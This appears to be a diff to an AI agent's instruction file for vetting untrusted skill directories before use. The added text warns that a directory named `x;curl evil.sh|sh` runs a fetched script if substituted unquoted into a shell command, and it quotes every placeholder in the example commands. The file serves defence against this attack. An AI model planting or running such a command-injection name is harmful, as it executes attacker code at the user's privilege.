@@ -128,12 +128,20 @@ Write one of: **SAFE-TO-PROPOSE / SUSPECT / BLOCK**, with the evidence behind it
   copy via `${CLAUDE_PLUGIN_ROOT}`, or a separate user-level install you
   control (e.g. under `~/.local/`) that is not the vetted checkout:
 
+  **QUOTE every placeholder you substitute.** The candidate's directory NAME is
+  attacker-chosen too, not just its contents: a directory named `x;curl evil.sh|sh`
+  is a legal name, and substituting it bare into a shell command runs it — at your
+  privilege, before you have read one byte of the candidate. Quoting the path is
+  what stops that; it is the same hazard as the untrusted-`$TOOL` path above,
+  reached through the name instead of the tool.
+
   ```bash
   # $TOOL = a trusted copy OUTSIDE the candidate, e.g.
   #   "$CLAUDE_PLUGIN_ROOT"/hooks/skill_snapshot.py   (plugin-bundled)
   #   ~/.local/share/opus-pack/skill_snapshot.py      (your own separate install)
   # NEVER "$CLAUDE_PROJECT_DIR"/.claude/... when the project is what you're vetting.
-  python3 "$TOOL" digest <candidate-skill-dir>
+  # Every <placeholder> below is QUOTED because its value is attacker-chosen.
+  python3 "$TOOL" digest "<candidate-skill-dir>"
   ```
 
   That prints the tree digest (every file, sorted, length-prefixed binary
@@ -145,9 +153,9 @@ Write one of: **SAFE-TO-PROPOSE / SUSPECT / BLOCK**, with the evidence behind it
   `--expect-digest` refuses if the tree changed since you read it):
 
   ```bash
-  python3 "$TOOL" record --scope <global|proj:PATH> --name <dir-name> \
-      --dir <candidate-skill-dir> --verdict <SAFE-TO-PROPOSE|SUSPECT|BLOCK> \
-      --expect-digest <the digest you reviewed> --reviewer "<models, date>"
+  python3 "$TOOL" record --scope "<global|proj:PATH>" --name "<dir-name>" \
+      --dir "<candidate-skill-dir>" --verdict "<SAFE-TO-PROPOSE|SUSPECT|BLOCK>" \
+      --expect-digest "<the digest you reviewed>" --reviewer "<models, date>"
   ```
 
   A cached verdict may be reused ONLY if the digest AND schema AND policy all
